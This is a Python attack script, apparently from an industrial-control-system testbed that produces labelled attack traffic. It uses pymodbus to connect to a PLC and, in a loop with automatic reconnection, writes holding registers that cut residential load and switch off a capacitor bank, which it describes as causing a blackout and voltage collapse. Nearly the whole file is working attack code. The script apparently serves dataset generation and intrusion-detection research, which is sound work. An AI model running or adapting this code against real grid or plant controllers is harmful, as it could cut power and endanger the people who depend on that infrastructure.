"""
Attack #2: Coil_Manipulation_FC05 (Breaker/Switch Manipulation)
==================================================================
Target register: HR0 (Residential Load Shed) + HR1 (Capacitor)
Technique: Directly commands the PLC to cut residential load and disable
           the capacitor bank.
Effect: Residential power is cut and the voltage compensation circuit is
        disabled with no physical cause, triggering a blackout and voltage
        collapse.
MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message
                      T0831 - Manipulation of Control
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR0_LOAD_SHED, HR1_CAPACITOR,
    ATTACK_LOOP_DELAY,
    LABEL_COIL_MANIPULATION
)


# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
LOAD_SHED_VALUE  = 1     # 1 = CUT residential load
CAPACITOR_VALUE  = 0     # 0 = TURN OFF capacitor (voltage compensation disabled)

ATTACK_NAME = "Coil_Manipulation_FC05"
ATTACK_ID   = LABEL_COIL_MANIPULATION


def run_attack(duration_sec=600, label_manager=None):
    """
    Runs the FC05 coil manipulation attack.

    Scenario:
    1. HR0 = 1 -> cut residential load (ResLoad disabled)
    2. HR1 = 0 -> turn off capacitor (no voltage compensation)
    Result: residential area goes dark and voltage drops rapidly.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT} - HR0 + HR1")
    print(f"  HR0={LOAD_SHED_VALUE} (load CUT) + HR1={CAPACITOR_VALUE} (capacitor OFF)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR0={LOAD_SHED_VALUE}, HR1={CAPACITOR_VALUE}"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR0_LOAD_SHED, value=LOAD_SHED_VALUE)
                client.write_register(address=HR1_CAPACITOR, value=CAPACITOR_VALUE)
                packet_count += 2
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [COIL] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 200 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [COIL] packet #{packet_count} | "
                      f"HR0=CUT, HR1=OFF | remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [COIL] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()

        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )

        print(f"\n  [COIL] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
